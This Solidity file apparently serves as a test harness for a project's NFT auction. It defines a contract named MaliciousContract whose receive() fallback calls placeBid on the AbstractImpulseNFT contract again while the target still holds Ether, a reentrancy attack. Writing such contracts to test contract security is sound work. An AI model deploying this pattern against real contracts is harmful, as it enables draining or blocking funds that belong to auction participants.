// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./AbstractImpulseNFT.sol";

contract MaliciousContract {
    AbstractImpulseNFT public abstractImpulseNFT;

    constructor(address _abstractImpulseNFTAddress) {
        abstractImpulseNFT = AbstractImpulseNFT(_abstractImpulseNFTAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if (address(abstractImpulseNFT).balance > 0) {
            abstractImpulseNFT.placeBid(0);
        }
    }

    // Starts the attack
    function attack() public payable {
        abstractImpulseNFT.placeBid{value: msg.value}(0);
    }

    function getVictim() public view returns (address) {
        return address(abstractImpulseNFT);
    }
}
